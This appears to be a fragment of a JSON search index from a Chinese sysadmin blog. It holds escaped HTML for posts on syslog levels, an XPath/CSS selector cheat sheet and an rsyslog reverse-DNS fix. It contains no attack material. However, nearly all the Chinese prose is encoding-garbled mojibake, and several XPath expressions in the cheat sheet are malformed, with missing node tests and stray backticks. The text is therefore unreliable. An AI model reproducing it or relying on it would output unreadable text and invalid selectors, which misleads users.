\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ealert           \u003cspan class=\"c1\"\u003e# å¿…é¡»é©¬ä¸Šå¤„ç†çš„  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eemerg/oanic     \u003cspan class=\"c1\"\u003e# ä¼šå¯¼è‡´ç³»ç»Ÿä¸å¯ç”¨çš„  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e*               \u003cspan class=\"c1\"\u003e# è¡¨ç¤ºæ‰€æœ‰çš„æ—¥å¿—çº§åˆ«\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enone            \u003cspan class=\"c1\"\u003e# è·Ÿ* ç›¸å,è¡¨ç¤ºå•¥ä¹Ÿæ²¡æœ‰  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003esyslogçš„æ—¥å¿—ä¼˜å…ˆæƒé»˜è®¤æ˜¯infoï¼Œè¿™æ—¶å€™ç”¨syslogä¸ºdebug(æœ€ä½æ—¥å¿—ä¼˜å…ˆæƒ)æ¥å†™æ—¥å¿—ï¼ŒsyslogæœåŠ¡æ˜¯ä¸ä¼šå†™å…¥æ—¥å¿—çš„ã€‚\u003c/p\u003e","title":"syslogçº§åˆ«è¯¦è§£"},{"content":"æœ€è¿‘åœ¨æpuppeteerçš„è‡ªåŠ¨åŒ–ï¼Œæœ‰å¾ˆå¤šåœ°æ–¹éœ€è¦ç”¨åˆ°CSS Selectorï¼Œä½†æ˜¯æŸäº›åœ°æ–¹åˆæ˜¯ç”¨Xpathæ–¹ä¾¿ï¼Œé‡‘æ‰‹æŒ‡æ”¾ä¸€ä¸‹ï¼Œå¤‡æŸ¥ï¼š\nTest queries in the Xpath test bed: Xpath test bed (whitebeam.org) Browser console $x(\u0026#34;//div\u0026#34;) Works in Firefox and Chrome.\n#Selectors Descendant selectors h1 //h1 div p `//div//p ul \u0026gt; li `//ul/li ul \u0026gt; li \u0026gt; a //ul/li/a div \u0026gt; * //div/* :root `/ :root \u0026gt; body /body Attribute selectors #id //*[@id=\u0026quot;id\u0026quot;] .class //*[@class=\u0026quot;class\u0026quot;] â€¦kinda input[type=\u0026quot;submit\u0026quot;] //input[@type=\u0026quot;submit\u0026quot;] a#abc[for=\u0026quot;xyz\u0026quot;] `//a[@id=\u0026ldquo;abc\u0026rdquo;][@for=\u0026ldquo;xyz\u0026rdquo;] a[rel] //a[@rel] a[href^='/'] `//a[starts-with(@href, \u0026lsquo;/\u0026rsquo;)] a[href$='pdf'] //a[ends-with(@href, '.pdf')] a[href*='://'] //a[contains(@href, '://')] a[rel~='help'] //a[contains(@rel, 'help')] â€¦kinda Order selectors ul \u0026gt; li:first-of-type `//ul/li[1] ul \u0026gt; li:nth-of-type(2) //ul/li[2] ul \u0026gt; li:last-of-type //ul/li[last()] li#id:first-of-type `//li[1][@id=\u0026ldquo;id\u0026rdquo;] a:first-child //*[1][name()=\u0026quot;a\u0026quot;] a:last-child //*[last()][name()=\u0026quot;a\u0026quot;] Siblings h1 ~ ul `//h1/following-sibling::ul h1 + ul //h1/following-sibling::ul[1] h1 ~ #id //h1/following-sibling::[@id=\u0026quot;id\u0026quot;] jQuery $('ul \u0026gt; li').parent() `//ul/li/.. $('li').closest('section') //li/ancestor-or-self::section $('a').attr('href') `//a/@href $('span').text() //span/text() Other things h1:not([id]) `//h1[not(@id)] Text match `//button[text()=\u0026ldquo;Submit\u0026rdquo;] Text match (substring) //button[contains(text(),\u0026quot;Go\u0026quot;)] Arithmetic //product[@price \u0026gt; 2.50] Has children //ul[*] Has children (specific) //ul[li] Or logic `//a[@name or @href] Union (joins results) `//a | //div Class check //div[contains(concat(\u0026#39; \u0026#39;,normalize-space(@class),\u0026#39; \u0026#39;),\u0026#39; foobar \u0026#39;)] Xpath doesnâ€™t have the â€œcheck if part of space-separated listâ€ operator, so this is the workaround (source).\n#Expressions Steps and axes // ul / a[@id='link'] Axis Step Axis Step Prefixes Prefix Example What // //hr[@class='edge'] Anywhere ./ ./a Relative / /html/body/div Root Begin your expression with any of these.\nAxes Axis Example What / //ul/li/a Child // //[@id=\u0026quot;list\u0026quot;]//a Descendant Separate your steps with /. Use two (//) if you donâ€™t want to select direct children.\nSteps //div //div[@name=\u0026#39;box\u0026#39;] //[@id=\u0026#39;link\u0026#39;] A step may have an element name (div) and predicates ([...]). Both are optional. They can also be these other things:\n//a/text() #=\u0026gt; \u0026#34;Go home\u0026#34; //a/@href #=\u0026gt; \u0026#34;index.html\u0026#34; //a/* #=\u0026gt; All a\u0026#39;s child elements #Predicates Predicates //div[true()] //div[@class=\u0026#34;head\u0026#34;] //div[@class=\u0026#34;head\u0026#34;][@id=\u0026#34;top\u0026#34;] Restricts a nodeset only if some condition is true. They can be chained.\nOperators # Comparison //a[@id = \u0026#34;xyz\u0026#34;] //a[@id != \u0026#34;xyz\u0026#34;] //a[@price \u0026gt; 25] # Logic (and/or) //div[@id=\u0026#34;head\u0026#34; and position()=2] //div[(x and y) or not(z)] Use comparison and logic operators to make conditionals.\nUsing nodes # Use them inside functions //ul[count(li) \u0026gt; 2] //ul[count(li[@class=\u0026#39;hide\u0026#39;]) \u0026gt; 0] # This returns `\u0026lt;ul\u0026gt;` that has a `\u0026lt;li\u0026gt;` child //ul[li] You can use nodes inside predicates.\nIndexing //a[1] # first \u0026lt;a\u0026gt; //a[last()] # last \u0026lt;a\u0026gt; //ol/li[2] # second \u0026lt;li\u0026gt; //ol/li[position()=2] # same as above //ol/li[position()\u0026gt;1] # :not(:first-of-type) Use [] with a number, or last() or position().\nChaining order a[1][@href=\u0026#39;/\u0026#39;] a[@href=\u0026#39;/\u0026#39;][1] Order is significant, these two are different.\nNesting predicates //section[.//h1[@id=\u0026#39;hi\u0026#39;]] This returns \u0026lt;section\u0026gt; if it has an \u0026lt;h1\u0026gt; descendant with id='hi'.\n#Functions Node functions name() # //[starts-with(name(), \u0026#39;h\u0026#39;)] text() # //button[text()=\u0026#34;Submit\u0026#34;] # //button/text() lang(str) namespace-uri() count() # //table[count(tr)=1] position() # //ol/li[position()=2] Boolean functions not(expr) # button[not(starts-with(text(),\u0026#34;Submit\u0026#34;))] String functions contains() # font[contains(@class,\u0026#34;head\u0026#34;)] starts-with() # font[starts-with(@class,\u0026#34;head\u0026#34;)] ends-with() # font[ends-with(@class,\u0026#34;head\u0026#34;)] concat(x,y) substring(str, start, len) substring-before(\u0026#34;01/02\u0026#34;, \u0026#34;/\u0026#34;) #=\u0026gt; 01 substring-after(\u0026#34;01/02\u0026#34;, \u0026#34;/\u0026#34;) #=\u0026gt; 02 translate() normalize-space() string-length() Type conversion string() number() boolean() #Axes Using axes //ul/li # ul \u0026gt; li //ul/child::li # ul \u0026gt; li (same) //ul/following-sibling::li # ul ~ li //ul/descendant-or-self::li # ul li //ul/ancestor-or-self::li # $(\u0026#39;ul\u0026#39;).closest(\u0026#39;li\u0026#39;) Steps of an expression are separated by /, usually used to pick child nodes. Thatâ€™s not always true: you can specify a different â€œaxisâ€ with ::.\n// ul /child:: li Axis Step Axis Step Child axis # both the same //ul/li/a //child::ul/child::li/child::a child:: is the default axis. This makes //a/b/c work.\n# both the same # this works because `child::li` is truthy, so the predicate succeeds //ul[li] //ul[child::li] # both the same //ul[count(li) \u0026gt; 2] //ul[count(child::li) \u0026gt; 2] Descendant-or-self axis # both the same //div//h4 //div/descendant-or-self::h4 // is short for the descendant-or-self:: axis.\n# both the same //ul//[last()] //ul/descendant-or-self::[last()] Other axes Axis Abbrev Notes ancestor ancestor-or-self attribute @ @href is short for attribute::href child div is short for child::div descendant descendant-or-self // // is short for /descendant-or-self::node()/ namespace self . . is short for self::node() parent .. .. is short for parent::node() following following-sibling preceding preceding-sibling There are other axes you can use.\nUnions //a | //span Use | to join two expressions.\n#More examples Examples //* # all elements count(//*) # count all elements (//h1)[1]/text() # text of the first h1 heading //li[span] # find a \u0026lt;li\u0026gt; with an \u0026lt;span\u0026gt; inside it # ...expands to //li[child::span] //ul/li/.. # use .. to select a parent Find a parent //section[h1[@id=\u0026#39;section-name\u0026#39;]] Finds a \u0026lt;section\u0026gt; that directly contains h1#section-name\n//section[//h1[@id=\u0026#39;section-name\u0026#39;]] Finds a \u0026lt;section\u0026gt; that contains h1#section-name. (Same as above, but uses descendant-or-self instead of child)\nClosest ./ancestor-or-self::[@class=\u0026#34;box\u0026#34;] Works like jQueryâ€™s $().closest('.box').\nAttributes //item[@price \u0026gt; 2*@discount] Finds \u0026lt;item\u0026gt; and check its attributes\n#References Xpath test bed (whitebeam.org) ","permalink":"https://rendoumi.com/posts/20240122-xpath_css_selector/","summary":"\u003cp\u003eæœ€è¿‘åœ¨æpuppeteerçš„è‡ªåŠ¨åŒ–ï¼Œæœ‰å¾ˆå¤šåœ°æ–¹éœ€è¦ç”¨åˆ°CSS Selectorï¼Œä½†æ˜¯æŸäº›åœ°æ–¹åˆæ˜¯ç”¨Xpathæ–¹ä¾¿ï¼Œé‡‘æ‰‹æŒ‡æ”¾ä¸€ä¸‹ï¼Œå¤‡æŸ¥ï¼š\u003c/p\u003e\n\u003ch3 id=\"test-queries-in-the-xpath-test-bed\"\u003eTest queries in the Xpath test bed:\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"http://www.whitebeam.org/library/guide/TechNotes/xpathtestbed.rhtm\"\u003eXpath test bed\u003c/a\u003e \u003cem\u003e(whitebeam.org)\u003c/em\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"browser-console\"\u003eBrowser console\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-js\" data-lang=\"js\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003e$x\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;//div\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eWorks in Firefox and Chrome.\u003c/p\u003e\n\u003ch2 id=\"selectors\"\u003e\u003ca href=\"https://devhints.io/xpath#selectors\"\u003e#\u003c/a\u003eSelectors\u003c/h2\u003e\n\u003ch3 id=\"descendant-selectors\"\u003eDescendant selectors\u003c/h3\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003e\u003ccode\u003eh1\u003c/code\u003e\u003c/th\u003e\n          \u003cth\u003e\u003ccode\u003e//h1\u003c/code\u003e\u003c/th\u003e\n          \u003cth\u003e\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003ediv p\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e`//div//p\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003eul \u0026gt; li\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e`//ul/li\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003eul \u0026gt; li \u0026gt; a\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e//ul/li/a\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003ediv \u0026gt; *\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e//div/*\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003e:root\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e`/\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003e:root \u0026gt; body\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e/body\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch3 id=\"attribute-selectors\"\u003eAttribute selectors\u003c/h3\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003e\u003ccode\u003e#id\u003c/code\u003e\u003c/th\u003e\n          \u003cth\u003e\u003ccode\u003e//*[@id=\u0026quot;id\u0026quot;]\u003c/code\u003e\u003c/th\u003e\n          \u003cth\u003e\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003e.class\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e//*[@class=\u0026quot;class\u0026quot;]\u003c/code\u003e \u003cem\u003eâ€¦\u003ca href=\"https://devhints.io/xpath#class-check\"\u003ekinda\u003c/a\u003e\u003c/em\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003einput[type=\u0026quot;submit\u0026quot;]\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e//input[@type=\u0026quot;submit\u0026quot;]\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003ea#abc[for=\u0026quot;xyz\u0026quot;]\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e`//a[@id=\u0026ldquo;abc\u0026rdquo;][@for=\u0026ldquo;xyz\u0026rdquo;]\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003ea[rel]\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e//a[@rel]\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003ea[href^='/']\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e`//a[starts-with(@href, \u0026lsquo;/\u0026rsquo;)]\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003ea[href$='pdf']\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e//a[ends-with(@href, '.pdf')]\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003ea[href*='://']\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e//a[contains(@href, '://')]\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003ea[rel~='help']\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e//a[contains(@rel, 'help')]\u003c/code\u003e \u003cem\u003eâ€¦\u003ca href=\"https://devhints.io/xpath#class-check\"\u003ekinda\u003c/a\u003e\u003c/em\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch3 id=\"order-selectors\"\u003eOrder selectors\u003c/h3\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003e\u003ccode\u003eul \u0026gt; li:first-of-type\u003c/code\u003e\u003c/th\u003e\n          \u003cth\u003e`//ul/li[1]\u003c/th\u003e\n          \u003cth\u003e\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003eul \u0026gt; li:nth-of-type(2)\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e//ul/li[2]\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003eul \u0026gt; li:last-of-type\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e//ul/li[last()]\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003eli#id:first-of-type\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e`//li[1][@id=\u0026ldquo;id\u0026rdquo;]\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003ea:first-child\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e//*[1][name()=\u0026quot;a\u0026quot;]\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003ea:last-child\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e//*[last()][name()=\u0026quot;a\u0026quot;]\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch3 id=\"siblings\"\u003eSiblings\u003c/h3\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003e\u003ccode\u003eh1 ~ ul\u003c/code\u003e\u003c/th\u003e\n          \u003cth\u003e`//h1/following-sibling::ul\u003c/th\u003e\n          \u003cth\u003e\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003eh1 + ul\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e//h1/following-sibling::ul[1]\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003eh1 ~ #id\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e//h1/following-sibling::[@id=\u0026quot;id\u0026quot;]\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch3 id=\"jquery\"\u003ejQuery\u003c/h3\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003e\u003ccode\u003e$('ul \u0026gt; li').parent()\u003c/code\u003e\u003c/th\u003e\n          \u003cth\u003e`//ul/li/..\u003c/th\u003e\n          \u003cth\u003e\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003e$('li').closest('section')\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e//li/ancestor-or-self::section\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003e$('a').attr('href')\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e`//a/@href\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003e$('span').text()\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e//span/text()\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch3 id=\"other-things\"\u003eOther things\u003c/h3\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003e\u003ccode\u003eh1:not([id])\u003c/code\u003e\u003c/th\u003e\n          \u003cth\u003e`//h1[not(@id)]\u003c/th\u003e\n          \u003cth\u003e\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eText match\u003c/td\u003e\n          \u003ctd\u003e`//button[text()=\u0026ldquo;Submit\u0026rdquo;]\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eText match (substring)\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e//button[contains(text(),\u0026quot;Go\u0026quot;)]\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eArithmetic\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e//product[@price \u0026gt; 2.50]\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eHas children\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e//ul[*]\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eHas children (specific)\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e//ul[li]\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eOr logic\u003c/td\u003e\n          \u003ctd\u003e`//a[@name or @href]\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eUnion (joins results)\u003c/td\u003e\n          \u003ctd\u003e`//a | //div\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch3 id=\"class-check\"\u003eClass check\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e//div\u003cspan class=\"o\"\u003e[\u003c/span\u003econtains\u003cspan class=\"o\"\u003e(\u003c/span\u003econcat\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39; \u0026#39;\u003c/span\u003e,normalize-space\u003cspan class=\"o\"\u003e(\u003c/span\u003e@class\u003cspan class=\"o\"\u003e)\u003c/span\u003e,\u003cspan class=\"s1\"\u003e\u0026#39; \u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e,\u003cspan class=\"s1\"\u003e\u0026#39; foobar \u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eXpath doesnâ€™t have the â€œcheck if part of space-separated listâ€ operator, so this is the workaround (\u003ca href=\"http://pivotallabs.com/xpath-css-class-matching/\"\u003esource\u003c/a\u003e).\u003c/p\u003e","title":"Xpathé‡‘æ‰‹æŒ‡"},{"content":"ç½‘ç®¡æ£€æŸ¥æµé‡å›¾çš„æ—¶å€™å‘ç°ï¼Œudpçš„æµé‡å¾ˆå¤š\nçœ‹äº†çœ‹æ—¥å¿—ï¼š\nJun 28 00:39:28 172.16.0.1 %ASA-6-305011: Built dynamic UDP translation from inside:172.16.36.2/2160 to outside:124.243.230.6/2160 Jun 28 00:39:28 172.16.0.1 %ASA-6-302015: Built outbound UDP connection 1369422617 for outside:223.5.5.5/53 (223.5.5.5/53) to inside:172.1... å‘ç°ä¸€å¤§å †æ˜¯æŸ¥è¯¢dns 53çš„\næ€äº†æ— å…³è¿›ç¨‹ï¼Œç»§ç»­ï¼Œè¿˜æœ‰æ˜¯é‚£ä¹ˆå¤šçš„udp 53 dnsæŸ¥è¯¢\næŸ¥äº†åŠå¤©æ‰å‘ç°ï¼Œæ˜¯rsyslogè®°å½•æ—¥å¿—çš„æ—¶å€™åæŸ¥ipçš„åŸŸåå¯¼è‡´çš„ï¼Œç”±äºæ˜¯å†…ç½‘åŸŸåéƒ½ä¸å¯¹ï¼Œæ‰€ä»¥ipæŸ¥ä¸åˆ°ï¼Œå°±ä¸åœçš„å¾€å…¬ç½‘dnså‘æŸ¥è¯¢ï¼Œå¯¼è‡´udpæµé‡æ¿€å¢ã€‚\nçŸ¥é“åŸå› å°±çŸ¥é“å¦‚ä½•è§£å†³äº†\nCentosä¸‹ï¼Œrsyslogå¢åŠ -x -Qç¦æ­¢è§£æçš„å‚æ•°ï¼š\nvi /etc/sysconfig/rsyslog # Options for rsyslogd # Syslogd options are deprecated since rsyslog v3. # If you want to use them, switch to compatibility mode 2 by \u0026#34;-c 2\u0026#34; # See rsyslogd(8) for more details SYSLOGD_OPTIONS=\u0026#34;-c 5 -x -Q\u0026#34; Ubuntuä¸‹ï¼Œæ–¹æ³•ä¸€æ ·ï¼Œæ–‡ä»¶ä¸ä¸€æ ·\nvi /etc/defaults/rsyslog RSYSLOGD_OPTIONS=\u0026#34;-x -Q\u0026#34; ç„¶åé‡å¯å°±å¯ä»¥äº†ã€‚\n","permalink":"https://rendoumi.com/posts/20240121-rsyslog_dns/","summary":"\u003cp\u003eç½‘ç®¡æ£€æŸ¥æµé‡å›¾çš„æ—¶å€™å‘ç°ï¼Œudpçš„æµé‡å¾ˆå¤š\u003c/p\u003e\n\u003cp\u003eçœ‹äº†çœ‹æ—¥å¿—ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eJun \u003cspan class=\"m\"\u003e28\u003c/span\u003e 00:39:28 172.16.0.1 %ASA-6-305011: Built dynamic UDP translation from inside:172.16.36.2/2160 to outside:124.243.230.6/2160  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eJun \u003cspan class=\"m\"\u003e28\u003c/span\u003e 00:39:28 172.16.0.1 %ASA-6-302015: Built outbound UDP connection \u003cspan class=\"m\"\u003e1369422617\u003c/span\u003e \u003cspan class=\"k\"\u003efor\u003c/span\u003e outside:223.5.5.5/53 \u003cspan class=\"o\"\u003e(\u003c/span\u003e223.5.5.5/53\u003cspan class=\"o\"\u003e)\u003c/span\u003e to inside:172.1...  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå‘ç°ä¸€å¤§å †æ˜¯æŸ¥è¯¢dns 53çš„\u003c/p\u003e\n\u003cp\u003eæ€äº†æ— å…³è¿›ç¨‹ï¼Œç»§ç»­ï¼Œè¿˜æœ‰æ˜¯é‚£ä¹ˆå¤šçš„udp 53 dnsæŸ¥è¯¢\u003c/p\u003e\n\u003cp\u003eæŸ¥äº†åŠå¤©æ‰å‘ç°ï¼Œæ˜¯rsyslogè®°å½•æ—¥å¿—çš„æ—¶å€™åæŸ¥ipçš„åŸŸåå¯¼è‡´çš„ï¼Œç”±äºæ˜¯å†…ç½‘åŸŸåéƒ½ä¸å¯¹ï¼Œæ‰€ä»¥ipæŸ¥ä¸åˆ°ï¼Œå°±ä¸åœçš„å¾€å…¬ç½‘dnså‘æŸ¥è¯¢ï¼Œå¯¼è‡´udpæµé‡æ¿€å¢ã€‚\u003c/p\u003e\n\u003cp\u003eçŸ¥é“åŸå› å°±çŸ¥é“å¦‚ä½•è§£å†³äº†\u003c/p\u003e\n\u003cp\u003eCentosä¸‹ï¼Œrsyslogå¢åŠ -x -Qç¦æ­¢è§£æçš„å‚æ•°ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /etc/sysconfig/rsyslog  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Options for 